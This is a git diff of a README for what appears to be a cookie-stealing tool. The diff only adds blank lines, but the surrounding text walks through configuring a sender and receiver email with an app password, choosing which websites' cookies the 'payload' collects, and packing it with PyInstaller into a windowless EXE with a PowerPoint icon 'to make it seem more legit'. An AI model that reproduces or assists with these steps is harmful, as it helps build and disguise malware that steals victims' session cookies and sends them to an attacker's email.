@@ -57,6 +57,7 @@ To set up the payload, you will need 2 email addresses, one to send and one to r
 
 ![image](https://user-images.githubusercontent.com/94969176/206349063-86e9bed2-55b2-4310-bb16-c764b5896801.png)
 - Copy the 16-digits code shown
+- 
 ![image](https://user-images.githubusercontent.com/94969176/206349272-a3c30194-d1e5-4c87-87fe-14d21cc65fbe.png)
 
 #### Putting it up on the payload and setting up the rest
@@ -69,12 +70,14 @@ To set up the payload, you will need 2 email addresses, one to send and one to r
 
 ![image](https://user-images.githubusercontent.com/94969176/206349810-97dcd923-9386-4698-ae2f-72c0fe3612e9.png)
 - You also can download different types of websites with cookies on it by changing the requirements on this piece of code
+
 ![image](https://user-images.githubusercontent.com/94969176/206350298-99828a85-63fb-4609-96bd-342cec42f06a.png)
 - Once you are ready, save it
 
 #### Packing it into an EXE
 - Open `Command Prompt`
 - Get the current directory (Folder) name and add `cd ` before it (If it's on another drive, just write the drive name, I.e. if the file is on D: drive, type `D:` and press enter)
+
 ![image](https://user-images.githubusercontent.com/94969176/206350644-a3fb6f0d-af6e-4854-97d0-894aed3deb3f.png)
 - type `Pyinstaller -F -w payload.exe`, I usually use a powerpoint icon to make it seem more legit, if you are using that as well, I provided mine in the project files, You can write `Pyinstaller -F -w -i pptxico.ico payload.exe`
 
